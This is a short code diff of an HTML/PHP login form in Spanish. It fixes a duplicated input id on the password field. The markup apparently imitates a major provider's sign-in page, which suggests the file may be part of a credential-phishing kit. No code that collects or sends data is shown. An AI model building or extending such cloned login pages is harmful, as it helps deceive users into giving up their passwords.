@@ -1295,7 +1295,7 @@
                                         <div>
                                             <label class="hidden-label" for="Email">Ingresa tu dirección de correo electrónico.</label>
                                             <input id="Email" type="email" value="" spellcheck="false" name="email" placeholder="Correo electrónico o teléfono" autofocus>
-                                            <input id="Email" type="password" value="" spellcheck="false" name="contraseña" placeholder="Ingresa tu contraseña" autofocus>
+                                            <input id="Password" type="password" value="" spellcheck="false" name="contraseña" placeholder="Ingresa tu contraseña" autofocus>
 
                                             <input id="Passwd-hidden" type="password" spellcheck="false" class="hidden">
 											<?php 
